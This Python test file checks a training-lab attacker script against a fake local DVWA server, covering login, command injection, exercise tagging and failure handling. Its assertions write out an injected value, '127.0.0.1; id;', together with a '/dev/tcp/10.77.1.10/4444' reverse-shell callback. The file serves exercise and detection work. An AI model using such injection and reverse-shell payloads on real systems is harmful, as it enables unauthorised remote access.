"""Exercise 1 attacker script (issue #24) against a fake DVWA."""
import json
import os
import subprocess
import sys
import tempfile
import threading
import unittest
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
SCRIPT = os.path.join(ROOT, "ansible/roles/attacker/files/exercise1")


class FakeDvwa:
    def __init__(self, vulnerable=True):
        self.requests = []  # (method, path, user-agent, form)
        self.vulnerable = vulnerable
        fake = self

        class H(BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def page(self, body, cookie=None):
                data = body.encode()
                self.send_response(200)
                if cookie:
                    self.send_header("Set-Cookie", cookie)
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

            def do_GET(self):
                fake.requests.append(("GET", self.path, self.headers.get("User-Agent"), {}))
                self.page("<input type='hidden' name='user_token' value='abc123' />", "PHPSESSID=s1; Path=/")

            def do_POST(self):
                form = dict(urllib.parse.parse_qsl(self.rfile.read(int(self.headers["Content-Length"])).decode()))
                fake.requests.append(("POST", self.path, self.headers.get("User-Agent"), form))
                if form.get("user_token") != "abc123":
                    return self.page("CSRF token is incorrect")
                if self.path == "/vulnerabilities/exec/":
                    ok = fake.vulnerable and "security=low" in (self.headers.get("Cookie") or "") and "PHPSESSID" in (self.headers.get("Cookie") or "")
                    return self.page("<pre>uid=33(www-data) gid=33</pre>" if ok else "<pre>ping usage</pre>")
                self.page("logged in")

        self.srv = HTTPServer(("127.0.0.1", 0), H)
        self.url = "http://127.0.0.1:%d" % self.srv.server_port
        threading.Thread(target=self.srv.serve_forever, daemon=True).start()

    def close(self):
        self.srv.shutdown()
        self.srv.server_close()


class Exercise1(unittest.TestCase):
    def setUp(self):
        self.dvwa = FakeDvwa()
        self.work = tempfile.mkdtemp()

    def tearDown(self):
        self.dvwa.close()

    def run_script(self, *extra):
        return subprocess.run([sys.executable, SCRIPT, "--exercise-id", "ex-001", "--base-url", self.dvwa.url,
                               "--attacker-ip", "10.77.1.10", "--workdir", self.work, *extra],
                              capture_output=True, text=True)

    def test_logs_in_and_injects_at_security_low(self):
        r = self.run_script()
        self.assertEqual(r.returncode, 0, r.stderr)
        login, inject = [q for q in self.dvwa.requests if q[0] == "POST"]
        self.assertEqual((login[1], login[3]["username"]), ("/login.php", "admin"))
        self.assertEqual(inject[1], "/vulnerabilities/exec/")
        self.assertTrue(inject[3]["ip"].startswith("127.0.0.1; id;"))
        self.assertIn("/dev/tcp/10.77.1.10/4444", inject[3]["ip"])

    def test_every_request_carries_the_exercise_id_in_the_user_agent(self):
        self.run_script()
        self.assertEqual({q[2] for q in self.dvwa.requests}, {"opaleye-exercise1/ex-001"})

    def test_records_the_window_and_payload_for_the_hunt_notes(self):
        self.run_script()
        with open(os.path.join(self.work, "exercise1-ex-001.json")) as f:
            rec = json.load(f)
        self.assertTrue(rec["command_output_seen"])
        self.assertLessEqual(rec["started"], rec["ended"])

    def test_fails_loudly_when_the_injection_did_not_run(self):
        self.dvwa.vulnerable = False
        r = self.run_script()
        self.assertEqual(r.returncode, 1)
        self.assertIn("not seen", r.stderr)

    def test_unknown_target_is_refused_without_a_base_url(self):
        r = subprocess.run([sys.executable, SCRIPT, "--exercise-id", "ex-001", "--target", "t9"], capture_output=True, text=True)
        self.assertNotEqual(r.returncode, 0)


if __name__ == "__main__":
    unittest.main()
